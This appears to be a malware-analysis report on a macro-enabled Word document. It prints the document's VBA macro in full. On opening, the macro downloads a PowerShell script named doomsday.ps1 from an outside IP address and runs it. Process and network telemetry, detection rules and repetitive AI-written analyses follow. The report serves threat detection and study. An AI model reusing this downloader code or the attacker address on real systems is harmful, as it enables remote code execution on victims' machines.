crowdsourced_yara_results.description: This signature detects an office document with an embedded VBA project. While this is fairly common it is sometimes used for malicious intent.
crowdsourced_yara_results.author: InQuest Labs

macros.vba_code:
Private Declare PtrSafe Function URLDownloadToFile Lib "urlmon" _
    Alias "URLDownloadToFileA" (ByVal pCaller As Long, ByVal szURL As String, _
    ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
Sub document_open()
imgsrc = "http://45.140.147.81/doomsday.ps1"
dlpath = "C:\Users\Public\"
URLDownloadToFile 0, imgsrc, dlpath & "doomsday.ps1", 0, 0
x = Shell("POWERSHELL.exe " & _
           """C:\Users\Public\doomsday.ps1""", 1)
End Sub

trid.file_type: Word Microsoft Office Open XML Format document (with Macro)
Word Microsoft Office Open XML Format document

threat_severity.level_description: Severity MEDIUM because it was considered trojan.

sigma_analysis_results.rule_description: Detects a suspicious process spawning from one of the Microsoft Office suite products (Word, Excel, PowerPoint, Publisher, Visio, etc.)
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Markus Neis, FPT.EagleEye Team, Vadim Khrykov, Cyb3rEng, Michael Haag, Christopher Peacock @securepeacock, @scythe_io

match_context.values: @{Hashes=MD5=C32CA4ACFCC635EC1EA6ED8A34DF5FAC,SHA256=73A3C4AEF5DE385875339FC2EB7E58A9E8A47B6161BDC6436BF78A763537BE70,IMPHASH=194427A488ED1DD0A91731658B071667; CurrentDirectory=C:\Users\Bruno\AppData\Local\Temp\; OriginalFileName=PowerShell.EXE; Product=Microsoft\xae Windows\xae Operating System; Description=Windows PowerShell; EventID=1; ParentCommandLine="C:\Program Files (x86)\Microsoft Office\Office16\WINWORD.EXE" "C:\Program Files\Microsoft Office\root\Templates\design.docx.doc" /q; CommandLine=POWERSHELL.exe "C:\Users\Public\doomsday.ps1"; FileVersion=10.0.19041.546 (WinBuild.160101.0800); ParentImage=C:\Program Files (x86)\Microsoft Office\Office16\WINWORD.EXE; IntegrityLevel=High; Image=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

@{Hashes=SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; CurrentDirectory=C:\Windows\system32\; OriginalFileName=PowerShell.EXE; Product=Microsoft\xae Windows\xae Operating System; Description=Windows PowerShell; EventID=1; ParentCommandLine="C:\Program Files\Microsoft Office\Office16\WINWORD.EXE" /Automation -Embedding; CommandLine=POWERSHELL.exe "C:\Users\Public\doomsday.ps1"; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentImage=C:\Program Files\Microsoft Office\Office16\WINWORD.EXE; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_title: Office Application Initiated Network Connection To Non-Local IP
sigma_analysis_results.rule_description:
Detects an office application (Word, Excel, PowerPoint)  that initiate a network connection to a non-private IP addresses.
This rule aims to detect traffic similar to one seen exploited in CVE-2021-42292.
This rule will require an initial baseline and tuning that is specific to your organization.
sigma_analysis_results.rule_author: Christopher Peacock '@securepeacock', SCYTHE '@scythe_io', Florian Roth (Nextron Systems), Tim Shelton

match_context.values: @{SourceIsIpv6=false; DestinationPort=80; DestinationIp=45.140.147.81; Protocol=tcp; SourceIp=192.168.2.27; DestinationIsIpv6=false; EventID=3; SourcePort=49750; Image=C:\Program Files\Microsoft Office\Office16\WINWORD.EXE; Initiated=true}

sigma_analysis_results.rule_description: Detects non-interactive PowerShell activity by looking at the "powershell" process with a non-user GUI process such as "explorer.exe" as a parent.

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\Bruno\AppData\Local\Temp\; OriginalFileName=PowerShell.EXE; Hashes=MD5=C32CA4ACFCC635EC1EA6ED8A34DF5FAC,SHA256=73A3C4AEF5DE385875339FC2EB7E58A9E8A47B6161BDC6436BF78A763537BE70,IMPHASH=194427A488ED1DD0A91731658B071667; Description=Windows PowerShell; EventID=1; ParentCommandLine="C:\Program Files (x86)\Microsoft Office\Office16\WINWORD.EXE" "C:\Program Files\Microsoft Office\root\Templates\design.docx.doc" /q; CommandLine=POWERSHELL.exe "C:\Users\Public\doomsday.ps1"; FileVersion=10.0.19041.546 (WinBuild.160101.0800); ParentImage=C:\Program Files (x86)\Microsoft Office\Office16\WINWORD.EXE; IntegrityLevel=High; Image=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

@{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Windows\system32\; OriginalFileName=PowerShell.EXE; Hashes=SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; Description=Windows PowerShell; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentCommandLine="C:\Program Files\Microsoft Office\Office16\WINWORD.EXE" /Automation -Embedding; CommandLine=POWERSHELL.exe "C:\Users\Public\doomsday.ps1"; EventID=1; ParentImage=C:\Program Files\Microsoft Office\Office16\WINWORD.EXE; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description: Detects the creation of a new office macro files on the systems

crowdsourced_ids_results.rule_msg: POLICY-OTHER HTTP request by IPv4 address attempt
crowdsourced_ids_results.rule_raw: alert tcp any any -> any $HTTP_PORTS ( msg:"POLICY-OTHER HTTP request by IPv4 address attempt"; flow:to_server,established; http_header; content:"Host:",fast_pattern,nocase; pcre:"/^Host\x3a\s*(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9]?[0-9])\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9]?[0-9])\s*:?\s*\d*\s*$/ims"; service:http; reference:url,www.w3.org/Protocols/rfc2616/rfc2616-sec15.html; classtype:policy-violation; sid:50447; rev:1; )

crowdsourced_ids_results.rule_msg: ET INFO PS1 Powershell File Request
crowdsourced_ids_results.rule_raw: alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"ET INFO PS1 Powershell File Request"; flow:established,from_client; flowbits:set,ET.PS.Download; http.request_line; content:".ps1 HTTP/1."; nocase; fast_pattern; classtype:bad-unknown; sid:2032162; rev:1; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, created_at 2021_03_18, deployment Perimeter, former_category INFO, signature_severity Informational, updated_at 2021_03_18;)

crowdsourced_ai_results.analysis:
The provided VBA macro code is malicious and could potentially be used to perform a variety of malicious actions, including:

1. Downloading and executing a malicious PowerShell script from a remote location.
2. Executing arbitrary PowerShell code on the target system.
3. Stealing sensitive information such as login credentials or other sensitive data.
4. Installing malware or spyware on the target system.

The malicious code is using the `URLDownloadToFile` function to download a PowerShell script from a remote location and then executing it using the `Shell` function. The script is being executed with elevated privileges, which could allow the attacker to perform actions that would otherwise be restricted.

It is important to note that this is just a simple example of a malicious VBA macro and there are many other ways that malware could be delivered and executed. It is also important to note that this is just a simple example and there are many other ways that malware could be delivered and executed.

The macros extracted from the document exhibit clear signs of malicious intent. Upon opening the document, the 'document_open()' subroutine is triggered. This subroutine first sets the variable 'imgsrc' to a remote URL hosting a PowerShell script ('http://45.140.147.81/doomsday.ps1'). Subsequently, it defines the download path ('dlpath') as 'C:\\Users\\Public\\', indicating an attempt to download the PowerShell script to the public user directory.

The macro then calls the 'URLDownloadToFile' function from the 'urlmon' library to download the 'doomsday.ps1' script from the specified URL to the local system at 'C:\\Users\\Public\\doomsday.ps1'. Following this, the macro uses the 'Shell' function to execute the downloaded PowerShell script using the 'POWERSHELL.exe' executable.

This behavior indicates a clear attempt to download and execute a potentially harmful PowerShell script without user consent or knowledge, which could lead to various malicious activities on the infected system.

The macro named 'document_open' performs the following actions:

1. Defines a variable 'imgsrc' with a URL pointing to an external server.
2. Defines another variable 'dlpath' set to a specific directory on the local system.
3. Utilizes the 'URLDownloadToFile' function to download a file named 'doomsday.ps1' from the specified URL to the defined local directory.
4. Executes the downloaded PowerShell script ('doomsday.ps1') using the 'Shell' function.

The behavior of this macro is highly suspicious as it downloads and executes an external script without any user interaction or consent. The downloaded script could potentially contain malicious code that could compromise the system or perform unauthorized actions.
